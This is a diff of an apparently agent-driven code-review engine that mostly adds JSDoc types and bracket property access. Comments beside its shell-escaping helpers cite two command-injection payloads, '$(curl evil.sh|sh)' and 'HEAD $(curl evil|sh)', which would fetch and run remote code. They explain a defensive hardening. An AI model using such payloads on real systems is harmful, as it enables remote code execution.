@@ -11,6 +11,19 @@ export const meta = {
   ],
 }
 
+/**
+ * @typedef {Parameters<typeof failedProfiles>[0][number] & { failedChecks?: string[], [k: string]: any }} Result  one profile's facts from reviewProfile
+ * @typedef {{ sizeBucket: string, lenses: string[], maxRounds: number, verifyVotes: number, lensModel: string, isLibrary: boolean, securitySensitive: boolean, intent: string, spec: string, churn: any[] }} Plan
+ * @typedef {{ [k: string]: any }} Vote  one verifier verdict (model output)
+ * @typedef {{ head?: any, [k: string]: any }} PriorRound  the loaded prior round (loader agent output)
+ * @typedef {ReturnType<typeof sliceDiff>[number]} Slice
+ * @typedef {{ deadlineMs?: number, breaker?: ReturnType<typeof makeDeathBreaker> | null, phase?: string, label?: string, [k: string]: unknown }} AgentOpts  agent() options plus the two this engine strips
+ * @typedef {{ why?: any, file?: any, severity?: any, [k: string]: any }} Finding  a finding as a model reports it, then as the pipeline stamps it
+ * @typedef {{ runner?: string, blockers?: string[], missingTools?: string[], ciCovers?: string[], notes?: string, partial?: boolean, [k: string]: any }} Preflight  the preflight agent's answer (model output)
+ * @typedef {{ baseRef?: unknown, preflight?: Preflight | null, isLibrary?: boolean, securitySensitive?: boolean }} Ctx  what a profile's gate prompt is built from
+ * @typedef {{ id: string, lang: string, detect: (files: string[]) => boolean, diffGlobs: string[], rubricSkill: string, fpRules: string, rollupRuleIds: string[], navSkill: string, reviewerAgent: string, securityHints: string, usesLibrary: boolean, alwaysLenses: string[], safetyLens: string, scoutRules: string, gate: (ctx: Ctx) => string, depContext: (ctx: Ctx) => string, lenses: string[], lensBrief: Record<string, string> }} Profile
+ */
+
 // ---- args ----
 // Three plausible spellings arrive here — a real object, a JSON string, and the `key=value` form the
 // skill's own invocation line advertises — and only the first used to work. The other two fell
@@ -125,14 +138,14 @@ function normalizeArgs(args, warn = () => {}) {
 }
 // <<< craft-inline
 const A = normalizeArgs(args, log)
-const baseArg = A.base ? String(A.base) : ''
-const intentArg = A.intent ? String(A.intent) : ''
-const postComments = !!A.comment
-let pathArg = A.path ? String(A.path) : ''   // optional crate-scope (audit per-crate fan-out)
+const baseArg = A['base'] ? String(A['base']) : ''
+const intentArg = A['intent'] ? String(A['intent']) : ''
+const postComments = !!A['comment']
+let pathArg = A['path'] ? String(A['path']) : ''   // optional crate-scope (audit per-crate fan-out)
 // Absolute path to the repo under review, when it is NOT the directory the session runs in. Without
 // it every agent runs `git diff` wherever the session happens to sit, so craft could only ever review
 // its own checkout — reviewing a PR in another repo silently reviewed craft instead.
-let repoArg = A.repo ? String(A.repo) : ''
+let repoArg = A['repo'] ? String(A['repo']) : ''
 // `path` is a git PATHSPEC resolved against the reviewed repo; `repo` selects the repo. An ABSOLUTE
 // `path` is therefore ambiguous in the one way the sandbox cannot resolve: it is either a repo the
 // caller meant to select, or a directory INSIDE the repo they meant to narrow to — and with no disk
@@ -150,6 +163,7 @@ let ambiguousPath = ''
 // what was ordered and what was done diverge — and the person who reads the verdict is not the
 // person who reads the log. An INCOMPLETE marker is the honest rendering of "we reviewed something
 // else than you asked for", however green the findings are.
+/** @type {string[]} */
 let scopeNotRun = []
 // The reader-facing twin of `scopeNotRun`: the same refusal spelled with this run's own paths, for
 // the report. Kept apart because `notRun` is ranked by exact string (see the assignment below).
@@ -170,6 +184,7 @@ let scopeDetail = ''
 // the drop happened before all of them. Appended to the synthesized report too rather than asked of
 // the synthesis model: what the review DID NOT cover is not something a prompt may forget.
 const scopeSection = () => (scopeNotRun.length ? `\n\n## Scope\n⚠️ ${scopeDetail || scopeNotRun.join('\n⚠️ ')}\n` : '')
+/** @param {unknown} p */
 function pathSegments(p) {
   const segs = []
   for (const s of String(p).split(/[\\/]+/)) {
@@ -180,6 +195,7 @@ function pathSegments(p) {
   return segs
 }
 // The repo-relative spelling of `abs`, or null when `abs` is not inside `repo`.
+/** @param {unknown} abs @param {unknown} repo */
 function relativeToRepo(abs, repo) {
   const r = pathSegments(repo)
   const p = pathSegments(abs)
@@ -215,7 +231,7 @@ if (ABSOLUTE_PATH.test(pathArg)) {
 // CLAUDE_PLUGIN_ROOT is set for us; when the engine is launched by scriptPath from a checkout it is
 // NOT, and the `:-.` fallback would resolve against the REVIEWED repo — the script would simply not
 // be there and the whole record would be lost to a "Cannot find module". Pass craftRoot then.
-const craftRootArg = A.craftRoot ? String(A.craftRoot) : ''
+const craftRootArg = A['craftRoot'] ? String(A['craftRoot']) : ''
 // Every logger command runs as `cd <reviewed repo> && node <logger>`, so the `:-.` fallback would be
 // resolved AFTER the cd — against the reviewed repo, where the script is not. That lost every
 // checkpoint, the finalize record and the prior-round chain to "Cannot find module", silently.
@@ -228,19 +244,19 @@ const craftRootArg = A.craftRoot ? String(A.craftRoot) : ''
 // other two found their script. Deferring the call to use time is what lets all three agree.
 const loggerPreludeNow = () => loggerPrelude(craftRootArg, CRAFT_VERSION, repoArg)
 const LOGGER_PATH = '"$CRAFT_LOGGER"'
-const viaArg = A._via ? String(A._via) : ''   // set by a parent workflow (e.g. rust-audit)
-const strict = !!A.strict   // harsh maintainability mode: confirmed maintainability findings become presumptive blockers
+const viaArg = A['_via'] ? String(A['_via']) : ''   // set by a parent workflow (e.g. rust-audit)
+const strict = !!A['strict']   // harsh maintainability mode: confirmed maintainability findings become presumptive blockers
 // The pin, RAW. Normalising it here as well as in `resolveProfilePin` is what made the helper's
 // hardening unreachable: an `Array.isArray` guard here turned a scalar `languages: 'rust'` into
 // `null` (pin silently dropped, review auto-detected instead), while a `.map(String)` turned
 // `[null]` into the string `'null'` — an "unknown id" that hard-aborted the run. One normalizer:
 // `resolveProfilePin` is the single place that decides what a pin means.
-const requestedLangs = A.languages
-const freshArg = !!A.fresh   // force a full first-pass review, ignore any prior round
+const requestedLangs = A['languages']
+const freshArg = !!A['fresh']   // force a full first-pass review, ignore any prior round
 // Every Nth re-review re-scans the FULL base...HEAD diff instead of only the fix delta, so a defect in
 // code an intermediate round did not touch is re-discovered. Default 3; 1 = every re-review is a full
 // re-scan (stateless, like adversarial-review); 0 = never (pure incremental — the pre-guard behavior).
-const fullEvery = (A.fullEvery != null) ? Math.max(0, Number(A.fullEvery)) : 3
+const fullEvery = (A['fullEvery'] != null) ? Math.max(0, Number(A['fullEvery'])) : 3
 
 // A cold full-workspace build is the one step in this workflow that can run for an hour and take the
 // whole review down with it: a gate agent that sits in `cargo clippy` stops emitting, the harness
@@ -385,6 +401,7 @@ const PREFLIGHT_SCHEMA = {
     notes: { type: 'string' },
   },
 }
+/** @param {Profile} profile @param {Ctx} ctx */
 function preflightPrompt(profile, ctx) {
   return `You are the PREFLIGHT for a ${profile.lang} review: resolve, cheaply and once, what the later steps must not rediscover. Diff base: ${ctx.baseRef ? `\`${flattenField(ctx.baseRef)}\`` : 'uncommitted changes / most recent commit'}.
 
@@ -445,6 +462,7 @@ Return runner, blockers, missingTools, ciCovers, probes, partial, notes.`
 // The fallback matches only the MARKER the prompt mandates — uppercase `PARTIAL:` — never the bare
 // word: `notes` now also carries CI CHECK NAMES (the past-the-cap list), and a green check called
 // `partial-build` matched `/\bPARTIAL\b/i` and flipped a complete preflight to 'partial'.
+/** @param {Preflight | null | undefined} pf */
 function preflightIsPartial(pf) {
   if (!pf) return false
   if (pf.partial === true) return true
@@ -452,6 +470,7 @@ function preflightIsPartial(pf) {
 }
 
 // Rendered into every downstream prompt that might run a tool, so the answer travels with the work.
+/** @param {Preflight | null | undefined} pf */
 function preflightBrief(pf) {
   // A dead preflight must NOT render as a clean one. Returning '' left the downstream prompt with no
   // preflight block at all — indistinguishable from a run where preflight said "nothing to report",
@@ -470,9 +489,11 @@ function preflightBrief(pf) {
 }
 
 // ================= language profiles (inline registry — the sandbox can't import, so profiles live here) =================
-function rustDepContext(ctx) {
+/** @param {Ctx} _ctx */
+function rustDepContext(_ctx) {
   return `8. **Dependency context** — review against the crate versions the project ACTUALLY pins, not against crates-in-the-abstract. Resolve them: \`cargo metadata --format-version 1\` (or read \`Cargo.lock\`) and match the external crates the changed files \`use\` to their locked versions. For any nontrivial dependency the diff touches, check whether the usage is correct *for that pinned version* — a since-deprecated/removed/renamed API, a changed default, a known footgun of that exact version. Consult context7 for the crate's version-specific docs instead of trusting memory. Turn a genuine version-specific misuse into a seed finding (source "dep-context", severity Medium, ruleId "DEP-001"). Known-vulnerable versions are already covered by \`cargo audit\` (ruleId "DEP-002") — do not duplicate. Best-effort: skip silently if \`cargo metadata\` fails or the diff touches no external crate.`
 }
+/** @param {Ctx} ctx */
 function rustGate(ctx) {
   return `You are establishing the mechanical gate for a Rust review, CI-aware, and collecting tool-grounded seed findings. Diff base: ${ctx.baseRef ? `\`${flattenField(ctx.baseRef)}\`` : 'uncommitted changes / most recent commit'}.
 
@@ -523,9 +544,11 @@ EVIDENCE RULE: report a check as pass/fail ONLY if you ran it yourself (quote th
 
 Set provenance to a one-line summary like "clippy/test via CI #123; fmt/audit/deny local". Put gate failures in failedChecks (NOT seedFindings). Seed findings come from clippy-pedantic / semver / semgrep / dep-context only. On every seed finding set \`ruleId\` to the matching rust-review rules.md catalog ID (e.g. "DEP-001") or "" if none fits.`
 }
-function nixDepContext(ctx) {
+/** @param {Ctx} _ctx */
+function nixDepContext(_ctx) {
   return `6. **Dependency context** — review against the flake inputs the project ACTUALLY pins. Resolve them from \`flake.lock\` (the locked \`rev\`/\`narHash\` per input). Flag inputs that are unpinned, channel-based (\`<nixpkgs>\`), or floating where they should be locked, and \`inputs.*.follows\` that should dedupe nixpkgs but don't (source "dep-context", severity Medium, ruleId "DEP-001"). Best-effort: skip silently if there is no flake.`
 }
+/** @param {Ctx} ctx */
 function nixGate(ctx) {
   return `You are establishing the mechanical gate for a Nix review and collecting tool-grounded seed findings. Diff base: ${ctx.baseRef ? `\`${flattenField(ctx.baseRef)}\`` : 'uncommitted changes / most recent commit'}.
 
@@ -559,12 +582,14 @@ const CONDITIONAL_LENSES = ['failure-windows']
 // The map is lens → the `scout.surfaces` boolean that must not be affirmatively `false` for the lens
 // to run. A missing surfaces object, a missing key, or `true` all KEEP the lens (see the gate in
 // reviewProfile): a lens is dropped only where the scout said, in so many words, the surface is absent.
+/** @type {Record<string, string>} */
 const SURFACE_GATED_LENSES = { 'negative-space': 'crossBoundarySymbol', 'compat': 'wireForm', 'invariants': 'invariantType' }
 
 // A changed file on one of these paths is a CERTAIN cross-boundary signal the scout can miss: a
 // `*-contracts` crate is a published cross-crate contract, and a `/crds/` schema (a Helm chart's CRD
 // dir included) is a wire form other versions of the code read. The gate reads this to FORCE the two
 // surfaces those paths imply ON — it never turns a surface off, so it can only ever ADD a lens back.
+/** @param {unknown} f */
 function isContractOrSchemaPath(f) {
   const p = String(f || '')
   return /(^|\/)crates\/(contracts|[^/]*-contracts)\//.test(p) || /(^|\/)crds\//.test(p)
@@ -608,15 +633,16 @@ const OPTIONAL_LENSES = ['performance', 'api-idioms', 'api-boundary']
 // An unrecognised name is REFUSED LOUDLY rather than dropped: `optional=perf` that quietly buys
 // nothing, on a run whose whole point was to buy something, is the exact silence this section exists
 // to prevent — and the run would then report the lens as skipped while the caller believed otherwise.
+/** @param {unknown} raw */
 function parseOptionalRequest(raw) {
   if (raw === undefined || raw === null || raw === '' || raw === false || raw === 'false' || raw === 'none') return { lenses: [], unknown: [] }
   if (raw === true || raw === 'true' || raw === 'all') return { lenses: [...OPTIONAL_LENSES], unknown: [] }
   const names = (Array.isArray(raw) ? raw : String(raw).split(/[\s,]+/)).map(x => String(x).trim()).filter(Boolean)
   return { lenses: names.filter(n => OPTIONAL_LENSES.includes(n)), unknown: names.filter(n => !OPTIONAL_LENSES.includes(n)) }
 }
-const optionalRequest = parseOptionalRequest(A.optional)
+const optionalRequest = parseOptionalRequest(A['optional'])
 if (optionalRequest.unknown.length) {
-  log(`⚠️ optional=${JSON.stringify(A.optional)} names ${optionalRequest.unknown.join(', ')}, which is not an optional lens — the optional roster is ${OPTIONAL_LENSES.join(', ')}. Only the recognised names were admitted.`)
+  log(`⚠️ optional=${JSON.stringify(A['optional'])} names ${optionalRequest.unknown.join(', ')}, which is not an optional lens — the optional roster is ${OPTIONAL_LENSES.join(', ')}. Only the recognised names were admitted.`)
 }
 const optionalRequested = optionalRequest.lenses
 // The optional tally is DERIVED, never accumulated. `ran`/`skipped` used to be snapshotted off the
@@ -669,6 +695,7 @@ const optionalSection = () => {
 // savedSurfaceDrops (lib/profile-merge.mjs), which keeps only profiles past their gate and subtracts
 // what ran elsewhere. Declared here, not where the profiles run, because out() reads it through
 // surfaceGateSection() on every early exit too — where it is simply still empty.
+/** @type {Result[]} */
 const results = []
 // The merge and the record's `gate` / `surfaceGate` fields live in lib/profile-merge.mjs (tested
 // there) and are pasted in by the craft-inline gate.
@@ -812,11 +839,12 @@ const surfaceGateSection = () => {
     + (named.length ? `\n⚠️ The completeness critic named ${named.join(', ')} as an uncovered surface for THIS diff. It was still NOT dispatched — the surface gate is the deliberate boundary, not something a model re-opens mid-run — so treat this as a visible gap, not a clean pass.\n` : '')
 }
 
+/** @type {Record<string, Profile>} */
 const PROFILES = {}
-PROFILES.rust = {
+PROFILES['rust'] = {
   id: 'rust',
   lang: 'Rust',
-  detect: (files) => files.some(f => /\.rs$/.test(f) || /(^|\/)Cargo\.toml$/.test(f)),
+  detect: (/** @type {string[]} */ files) => files.some(f => /\.rs$/.test(f) || /(^|\/)Cargo\.toml$/.test(f)),
   diffGlobs: ["'*.rs'"],
   rubricSkill: 'rust-review',
   fpRules: 'fp-rules.md', // exclusion catalog (FP-*/KEEP-*); '' for a profile that ships none
@@ -850,10 +878,10 @@ PROFILES.rust = {
     'negative-space': 'negative space / cross-surface interaction: the bug the diff ENABLES in UNCHANGED code. A new status/type/enum-variant/column that pre-existing endpoints mutate blindly; a latent bug in an unchanged helper the diff makes reachable for the first time.',
   },
 }
-PROFILES.nix = {
+PROFILES['nix'] = {
   id: 'nix',
   lang: 'Nix',
-  detect: (files) => files.some(f => /\.nix$/.test(f) || /(^|\/)flake\.lock$/.test(f)),
+  detect: (/** @type {string[]} */ files) => files.some(f => /\.nix$/.test(f) || /(^|\/)flake\.lock$/.test(f)),
   diffGlobs: ["'*.nix'", "'flake.lock'"],
   rubricSkill: 'nix-review',
   fpRules: '',
@@ -1353,9 +1381,11 @@ const ATTACK_SCHEMA = {
 const CRAFT_VERSION = '0.22.0' // x-release-please-version
 // Severity ordering, worst first. Lives in the declarations prefix (not next to its first use in
 // dedupPool) so severity-ranking helpers stay unit-testable — the test harness evals this prefix.
+/** @type {Record<string, number>} */
 const SEV_RANK = { Critical: 0, High: 1, Medium: 2, Low: 3, Info: 4 }
 // One-notch severity demotion (test-only reachability). In the declarations prefix alongside
 // SEV_RANK so the severity helpers stay unit-testable.
+/** @type {Record<string, string>} */
 const DEMOTE = { Critical: 'High', High: 'Medium', Medium: 'Low', Low: 'Info', Info: 'Info' }
 // ---- adjudicate-track pure helpers ----
 // These live in lib/review-adjudicate.mjs — a real, linted module with real unit tests that IMPORT
@@ -1876,17 +1906,19 @@ function markTrackedUnverified(findings, livePriors, retired, fallbackMatch) {
 // NOT make it shell-safe: it only escapes `"`/`\`/control chars, and inside a double-quoted shell
 // context `$(...)`, backtick and `$VAR` still expand, so a file literally named `$(curl evil.sh|sh)`
 // would execute when the carry agent runs the command. shq() single-quotes it, disabling all expansion.
+/** @param {unknown} v */
 function flattenField(v) { return String(v ?? '').replace(/[\r\n]+/g, ' ').trim().slice(0, ATTACK_MAX) }
+/** @param {Finding} f */
 function promptFields(f) {
   return {
-    title: flattenField(f.title),
-    symbol: flattenField(f.symbol) || '?',
-    ruleId: flattenField(f.ruleId) || '—',
-    file: flattenField(f.file),
-    severity: flattenField(f.severity),
+    title: flattenField(f['title']),
+    symbol: flattenField(f['symbol']) || '?',
+    ruleId: flattenField(f['ruleId']) || '—',
+    file: flattenField(f['file']),
+    severity: flattenField(f['severity']),
     // A locator field like file/symbol: paths and identifiers are load-bearing (the verifier is
     // told to OPEN it), so flatten newlines but keep `_ < > [ ]` intact — see flattenField.
-    whereChecked: flattenField(f.whereChecked),
+    whereChecked: flattenField(f['whereChecked']),
   }
 }
 // POSIX single-quote shell-escaper for a model-authored value that lands in a shell command a
@@ -1901,12 +1933,14 @@ function promptFields(f) {
 // lib/run-logging.mjs in the other three engines and is blind to it here. A hardening that lands on
 // the source therefore regenerates into three engines and silently skips the fourth, which is the
 // only one passing model-authored `repo`/`runDir` through it. Change one, change this by hand.
+/** @param {unknown} s */
 function shq(s) { return `'${String(s ?? '').replace(/'/g, `'\\''`)}'` }
 // A conservative "is this a safe commit-ish?" gate for a model-authored ledger `head` before it is
 // interpolated into a shell command. Accept a git SHA (7–40 hex) or a ref name drawn only from
 // shell-inert characters (alnum plus `._/-`, no spaces/metacharacters). A crafted `HEAD $(curl evil|sh)`
 // fails — it carries a space and `$()`. Used at the prior-round LOAD boundary to fall back to a safe
 // default without disabling re-review; the use sites additionally shq()/flattenField() it (defense in depth).
+/** @param {unknown} s */
 function isCommitish(s) {
   const v = String(s ?? '').trim()
   if (!v) return false
@@ -2014,8 +2048,9 @@ function priorFoundSummary(pool, { maxChars = PRIOR_SUMMARY_MAX_CHARS, titleMax 
 // The invariant string interpolated into the red-team prompt is model-authored (from the
 // adjudicator's own verdict, falling back to the finding `why`). Route it through sanitizeAttack
 // so runaway/injected structure cannot restyle or hijack the next agent's prompt.
+/** @param {{ invariant?: unknown, [k: string]: any }} adj @param {Finding} f */
 function redTeamInvariant(adj, f) {
-  return sanitizeAttack(adj.invariant) || sanitizeAttack(f.why)
+  return sanitizeAttack(adj.invariant) || sanitizeAttack(f['why'])
 }
 
 
@@ -2518,11 +2553,12 @@ function makeDeadlineBudget(totalMs, { floorMs = 0, schedule = setTimeout, cance
 
 const DEADLINE_HIT = { craftDeadline: true }
 const DEFAULT_DEADLINE_MS = 1800000
+/** @type {Record<string, number>} */
 const PHASE_DEADLINE_MS = { Scout: 900000, Gate: 1800000, Lenses: 5400000, Verify: 1800000, Adjudicate: 1800000, Synthesize: 1800000 }
 // A caller-supplied ceiling, applied to every phase that does not name its own. It only ever
 // REPLACES the per-phase table, never the explicit `deadlineMs` an individual dispatch passes —
 // preflight's 5min is a property of preflight, not a default to be overridden from the outside.
-const deadlineArg = Number(A.deadlineMs) > 0 ? Number(A.deadlineMs) : 0
+const deadlineArg = Number(A['deadlineMs']) > 0 ? Number(A['deadlineMs']) : 0
 // The CEILING on the smallest remainder a re-dispatch is allowed to be launched into — not the
 // floor itself, which is derived from the budget by `retryFloorFor` below. A POLICY DECISION, not a
 // measurement: nothing recorded derives it. It is set against the measured live distribution from
@@ -2541,7 +2577,7 @@ const RETRY_FLOOR_MS = 60000
 // been touched. `deadlineMs=30000` is a documented diagnostic setting, so this is reachable, not
 // theoretical. Half the budget is the cap: it keeps the guard meaningful at every scale, since a
 // remainder under half of what the first attempt had is a poor bet whatever the absolute numbers.
-const retryFloorMs = totalMs => Math.min(RETRY_FLOOR_MS, Math.floor((Number(totalMs) > 0 ? Number(totalMs) : 0) / 2))
+const retryFloorMs = (/** @type {unknown} */ totalMs) => Math.min(RETRY_FLOOR_MS, Math.floor((Number(totalMs) > 0 ? Number(totalMs) : 0) / 2))
 // SAID OUT LOUD, once, at the top of the run. This one argument replaces the WHOLE phase table,
 // including the 90 minutes a lens is legitimately allowed (one measured lens ran 46). Set too low it
 // kills live work by deadline, and a run full of deadline fires is indistinguishable, in the
@@ -2557,8 +2593,8 @@ if (deadlineArg) {
   // deadline log was fixed for, inverted — and worse here, because 30000 is exactly the documented
   // diagnostic value this warning exists to explain, so the one reader it was written for is the one
   // it would mislead.
-  const m = v => (v >= 60000 ? `${Math.round(v / 60000)}min` : `${Math.max(1, Math.round(v / 1000))}s`)
-  const moved = dir => Object.entries(PHASE_DEADLINE_MS).filter(([, v]) => (dir < 0 ? v > deadlineArg : v < deadlineArg)).map(([k, v]) => `${k} ${m(v)}→${m(deadlineArg)}`)
+  const m = (/** @type {number} */ v) => (v >= 60000 ? `${Math.round(v / 60000)}min` : `${Math.max(1, Math.round(v / 1000))}s`)
+  const moved = (/** @type {number} */ dir) => Object.entries(PHASE_DEADLINE_MS).filter(([, v]) => (dir < 0 ? v > deadlineArg : v < deadlineArg)).map(([k, v]) => `${k} ${m(v)}→${m(deadlineArg)}`)
   const shortened = moved(-1)
   const lengthened = moved(1)
   log(`⏱️ deadlineMs=${deadlineArg} replaces the per-phase deadline table for every phase that does not name its own`
@@ -2571,11 +2607,13 @@ if (deadlineArg) {
     // right one.
     + `${deadlineArg < RETRY_FLOOR_MS * 2 ? ` NOTE: for the phases this argument governs, the re-dispatch floor drops with it to ${Math.round(Math.floor(deadlineArg / 2) / 1000)}s, so a dead agent gets a much shorter second attempt than usual; a dispatch carrying its own deadline keeps its own floor.` : ''}`)
 }
+/** @param {AgentOpts} opts */
 function deadlineMsFor(opts) {
   const explicit = Number(opts.deadlineMs)
   if (Number.isFinite(explicit) && explicit > 0) return explicit
-  return deadlineArg || (PHASE_DEADLINE_MS[opts.phase] ?? DEFAULT_DEADLINE_MS)
+  return deadlineArg || (PHASE_DEADLINE_MS[/** @type {string} */ (opts.phase)] ?? DEFAULT_DEADLINE_MS)
 }
+/** @param {string} prompt @param {AgentOpts} [opts] */
 async function ragent(prompt, opts = {}) {
   // deadlineMs and breaker are ours, not agent()'s — strip them so neither reaches the harness as an
   // unknown option.
@@ -2595,9 +2633,10 @@ async function ragent(prompt, opts = {}) {
   }
 }
 
+/** @param {string} prompt @param {Record<string, unknown>} agentOpts @param {ReturnType<typeof makeDeadlineBudget>} budget @param {ReturnType<typeof makeDeathBreaker> | null | undefined} breaker @param {AgentOpts} opts */
 async function withBudget(prompt, agentOpts, budget, breaker, opts) {
   for (let attempt = 1; ; attempt++) {
-    const o = attempt === 1 ? agentOpts : { ...agentOpts, label: `retry:${agentOpts.label || 'agent'}` }
+    const o = attempt === 1 ? agentOpts : { ...agentOpts, label: `retry:${agentOpts['label'] || 'agent'}` }
     // The SHARED deadline promise, not a per-attempt timer. A second attempt inherits what is left
     // of the first one's wait by construction — there is nothing to subtract and no clock to read.
     const res = await Promise.race([agent(`${REPO_DIRECTIVE}${prompt}`, o), budget.hit])
@@ -2626,7 +2665,7 @@ async function withBudget(prompt, agentOpts, budget, breaker, opts) {
       // The re-dispatch survives for the case it was always really for: the FAST death, which spends
       // almost none of the budget. A hang is evidence about the request; a fast death is evidence
       // about reachability, and only the second is worth asking twice.
-      log(`⏱️ agent '${o.label || '?'}' exhausted its ${waited} with no response — abandoning the wait (the deadline is one budget shared by the attempts and a fire spends it, so there is nothing left to re-dispatch into; treated as a dead agent)`)
+      log(`⏱️ agent '${o['label'] || '?'}' exhausted its ${waited} with no response — abandoning the wait (the deadline is one budget shared by the attempts and a fire spends it, so there is nothing left to re-dispatch into; treated as a dead agent)`)
       return null
     }
     if (res !== null && res !== undefined) {
@@ -2715,12 +2754,14 @@ function reviewVerdict(confirmed) {
 // OR a maintainability finding was merged into it during cross-lens dedup (dedupPool carries every
 // contributing source in `sources`). Without the second clause a maintainability finding absorbed
 // under a same-severity non-maintainability base would silently escape the strict Block.
+/** @param {Finding} f */
 function isMaintainability(f) {
-  return (f.source || '') === 'maintainability' || (Array.isArray(f.sources) && f.sources.includes('maintainability'))
+  return (f['source'] || '') === 'maintainability' || (Array.isArray(f['sources']) && f['sources'].includes('maintainability'))
 }
+/** @param {Finding[]} confirmed */
 function finalVerdict(confirmed) {
   if (strict && confirmed.some(f => isMaintainability(f)
-    && (f.severity === 'Critical' || f.severity === 'High' || f.severity === 'Medium'))) return 'Block'
+    && (f['severity'] === 'Critical' || f['severity'] === 'High' || f['severity'] === 'Medium'))) return 'Block'
   return reviewVerdict(confirmed)
 }
 // indexProjection is NOT mirrored here any more: lib/craft-log-run.mjs imports the real one and owns
@@ -2737,7 +2778,9 @@ function finalVerdict(confirmed) {
 // The choice is deliberate and recorded (realm @nick/craft, node #34): a lost record NEVER fails the
 // run. Killing a three-hour review over a bookkeeping write would teach everyone to ignore the very
 // marker this exists to raise. It is reported instead, in the report a human actually reads.
+/** @type {string[]} */
 const telemetryLost = []
+/** @param {string} what @param {unknown} [why] */
 function noteTelemetryLoss(what, why) {
   const line = `${what}${why ? ` — ${why}` : ''}`
   telemetryLost.push(line)
@@ -2753,6 +2796,7 @@ const ragentQuietly = quietly(ragent)
 // chaining and no signal. `reReviewMemory` (below) sets this note; it is null on every run that chained
 // normally or is a genuine first review, so the section is empty then. Declared before `out()` so an
 // early exit that returns before the prior-round read sees a plain null, never a temporal-dead-zone.
+/** @type {string | null} */
 let reReviewMemoryNote = null
 // Prepended by `out()` — near the top, above the verdict — because a re-review that quietly forgot its
 // memory must be visible before the verdict, not buried after it.
@@ -2761,18 +2805,22 @@ const reReviewMemorySection = () => (reReviewMemoryNote ? `## ⚠️ Re-review m
 // (typically: the craft plugin is not enabled in this project) runs every lens on the generic subagent.
 // The review still happens — but without the agent's rubric, and the operator otherwise sees only a
 // failed probe. Stated above the verdict, with the fix; recorded on the run record.
+/** @type {{ id: string, agent: string, error: string }[]} */
 const reviewerAgentUnavailable = []
 // Only an error that is about the AGENT TYPE counts: a missing model, a file or tool not found inside
 // the agent, or an HTTP 404 also say "not found", and an "install the plugin" line for those would send
 // the operator to the wrong fix.
-const isAgentTypeMissing = (msg, agent) => /not found/i.test(msg) && (/agent type/i.test(msg) || msg.includes(agent))
+const isAgentTypeMissing = (/** @type {string} */ msg, /** @type {string} */ agent) => /not found/i.test(msg) && (/agent type/i.test(msg) || msg.includes(agent))
+/** @param {Profile} profile @param {unknown} error */
 function noteReviewerAgentMissing(profile, error) {
   if (!reviewerAgentUnavailable.some(x => x.id === profile.id)) reviewerAgentUnavailable.push({ id: profile.id, agent: profile.reviewerAgent, error: String(error || '').slice(0, 160) })
 }
 // Lens dispatches that came back EMPTY from the reviewer agent and were re-run on the generic
 // subagent. On some runtimes that is how an unknown agent type looks; it can also be a transient
 // death, so it is not taken as "missing" — but it is said, per profile, rather than staying silent.
+/** @type {Record<string, number>} */
 const reviewerAgentFallbacks = {}
+/** @param {Profile} profile */
 function noteReviewerAgentFallback(profile) {
   reviewerAgentFallbacks[profile.id] = (reviewerAgentFallbacks[profile.id] || 0) + 1
 }
@@ -2789,6 +2837,7 @@ const reviewerAgentSection = () => {
 // Wraps every report the engine can return. Narrow on purpose: it fires only for a write that was
 // ATTEMPTED and did not land, never for telemetry that was never attempted — a marker that shows up
 // on healthy runs is a marker people stop reading, which is the symmetric half of the same defect.
+/** @param {string} reportText */
 function out(reportText) {
   return `${telemetryLostSection(telemetryLost)}${reReviewMemorySection()}${reviewerAgentSection()}${reportText}${optionalSection()}${surfaceGateSection()}`
 }
@@ -3289,6 +3338,7 @@ let rejoinArmed = false
 // the `ownDir` shortcut, read a mid-review branch move as "not this run's directory", and left the
 // run's own phases unfolded. Sticky, because an adoption is not undone by later checkpoints
 // succeeding — once a directory MIGHT be someone else's, it stays might-be for the finalize proof.
+/** @param {string} phase @param {Record<string, unknown>} payloadIn @param {string} group */
 async function checkpoint(phase, payloadIn, group) {
   // kind/name are what the checkpoint DIRECTORY is named after, and `recover` parses them back out of
   // that name to rebuild a dead run's identity. A payload without them produced a real
@@ -3337,6 +3387,7 @@ async function checkpoint(phase, payloadIn, group) {
 // quoted heredoc into the script. It no longer computes ts/project/commit/dirty, chooses the filename,
 // hand-appends the index or hand-verifies the readback; that recipe is what once persisted a completed
 // review as `dimensions: [], verification: null`. Fewer decisions in the prompt is the whole fix.
+/** @param {Record<string, unknown>} recordIn */
 async function logRun(recordIn) {
   // Every review record — the early exits too, not only reviewRecord() — says which engine computed its
   // fingerprints: a later round decides their basis by this (realm @nick/craft #111). Last, so no
@@ -3359,8 +3410,9 @@ async function logRun(recordIn) {
   else if (landed.reason) noteTelemetryLoss('the run directory (the record itself landed)', landed.reason)
 }
 
+/** @param {Finding} f */
 function key(f) {
-  return `${(f.file || '').toLowerCase()}:${f.line || 0}:${(f.title || '').toLowerCase().replace(/\s+/g, ' ').trim()}`
+  return `${(f['file'] || '').toLowerCase()}:${f['line'] || 0}:${(f['title'] || '').toLowerCase().replace(/\s+/g, ' ').trim()}`
 }
 
 // >>> craft-inline lib/run-record.mjs titleShingle normalizeSymbol fingerprint shingleOverlap matchesPrior DISPOSITION_FROM_TRIAGE dispositionFromTriage rereviewVerdict reReviewMemory branchFromAbbrevRef ENGINE_REVISION FP_BASIS_SINCE fpBasisOf fpBasisEstablished sameFpBasis basisVerdictFromRevisions
@@ -3597,19 +3649,22 @@ function basisVerdictFromRevisions(revs, currentRev = ENGINE_REVISION) {
 //     prints an authoritative `ledgerCount` beside it; if the array that arrived is a different
 //     length, entries were lost in transport and an 82-entry round would otherwise be carried as a
 //     genuine 20-entry one. Degraded → full re-scan, same as a missing ledger.
+/** @param {PriorRound | null} priorRound */
 function ledgerTruncated(priorRound) {
   if (!priorRound) return false
-  const count = Number(priorRound.ledgerCount)
+  const count = Number(priorRound['ledgerCount'])
   if (!Number.isFinite(count)) return false   // a record from before the count existed: nothing to check
-  return count !== (Array.isArray(priorRound.ledger) ? priorRound.ledger.length : 0)
+  return count !== (Array.isArray(priorRound['ledger']) ? priorRound['ledger'].length : 0)
 }
+/** @param {PriorRound | null} priorRound */
 function ledgerDegraded(priorRound) {
   if (!priorRound) return false
   if (ledgerTruncated(priorRound)) return true
-  const findings = Number(priorRound.priorFindings || 0)
-  const ledgerLen = Array.isArray(priorRound.ledger) ? priorRound.ledger.length : 0
+  const findings = Number(priorRound['priorFindings'] || 0)
+  const ledgerLen = Array.isArray(priorRound['ledger']) ? priorRound['ledger'].length : 0
   return findings > 0 && ledgerLen === 0
 }
